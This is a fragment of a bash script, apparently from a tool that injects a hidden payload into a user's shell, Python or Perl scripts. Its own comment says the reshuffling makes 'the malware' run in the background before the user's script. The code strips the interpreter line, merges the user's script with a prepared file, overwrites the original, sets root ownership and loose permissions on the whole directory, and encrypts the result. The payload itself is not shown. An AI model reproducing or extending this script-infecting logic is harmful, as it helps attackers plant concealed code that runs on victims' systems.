
stripHashBang() {
    
    
    local regex="$1"
    local fileExt="${2}"
    
    [[ -z "$regex" ]] && {
	printf "%s\n" "Null arguments are not allowed"
	exit 1
    }


    # We read the data to and fro so that the malware
    # will start running in the background before the users script
    ######################################################################
    while read fileContent;do
	printf "%s\n" "${fileContent}" >> "${dirfile}"
    done < "${fileName}"
    
    
    sed -i "s/^#\!.*$(echo "${regex}")//g" "${dirfile}" #Striping off intereperter
    echo "!" >> "${dirfile}"
    
    
    
    while read fileContent;do
	printf "%s\n" "${fileContent}" >> "${fileName}"
    done < "${dirfile}"
    #############################################################################
    cp "${dirfile}" "${fileName}"
    
    [[ "${dirfile}" != "tempScript.sh" ]] && rm "${fileName}.${fileExt}"
    
    
    chown root:root ./*
    chmod 775 ./*
}

scrConfig() {
    local fileExt="${1}"
    case ${fileExt} in
    sh)
	_sh
	while read fileContents;do
	    
	    printf "%s\n" "${fileContents}" >> "${dirfile}"
	    
	done < "${fileName}"

	cp "${dirfile}" "${fileName}"

	[[ "${dirfile}" != "tempScript.sh" ]] && rm "${fileName}.${fileExt}"
	
	chown root:root ./*
	chmod 775 ./*
	crypt "shell script" "${CRYPT}"
	;;
    py)
	_py
	stripHashBang "python" "${fileExt}"
	crypt "python script" "${CRYPT}"
	;;
    pl)
	_pl
	stripHashBang "perl" "${fileExt}"
	crypt "perl script" "${CRYPT}"
	;;
    esac
}
